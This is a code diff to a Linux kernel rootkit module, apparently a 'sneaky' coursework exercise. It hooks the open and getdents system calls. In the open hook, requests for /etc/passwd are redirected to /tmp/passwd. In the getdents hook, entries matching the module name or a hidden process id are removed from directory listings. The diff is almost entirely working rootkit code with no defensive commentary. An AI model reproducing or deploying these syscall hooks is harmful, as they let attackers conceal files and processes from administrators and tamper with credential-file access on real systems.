@@ -65,6 +65,15 @@ asmlinkage int (*original_call_open)(const char *pathname, int flags);
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   printk(KERN_INFO "Open: Very, very Sneaky!\n");
+  
+  if (strcmp(pathname,"/etc/passwd")==0)
+    copy_to_user(pathname,"/tmp/passwd",11);
+
+
+  //copy_to_user(void __user *to, const void *from, unsigned
+  //long nbytes)
+
+
   return original_call_open(pathname, flags);
 }
 
@@ -118,20 +127,11 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
     if (strcmp(d->d_name,sneakyName)==0 || strcmp(d->d_name,pid_string)==0)
     {
       prev->d_reclen += d->d_reclen;
+      return nread; 
     }
-      //strcpy(d->d_name , "sneaky obfuscated");
 
-    // printf("%8ld  ", d->d_ino);
-    // d_type = *(buf + bpos + d->d_reclen - 1);
-    // printf("%-10s ", (d_type == DT_REG) ?  "regular" :
-    //                 (d_type == DT_DIR) ?  "directory" :
-    //                 (d_type == DT_FIFO) ? "FIFO" :
-    //                 (d_type == DT_SOCK) ? "socket" :
-    //                 (d_type == DT_LNK) ?  "symlink" :
-    //                 (d_type == DT_BLK) ?  "block dev" :
-    //                 (d_type == DT_CHR) ?  "char dev" : "???");
-    // printf("%4d %10lld  %s\n", d->d_reclen,
-    //        (long long) d->d_off, d->d_name);
+
+
     bpos += d->d_reclen;
     prev=d; 
    }
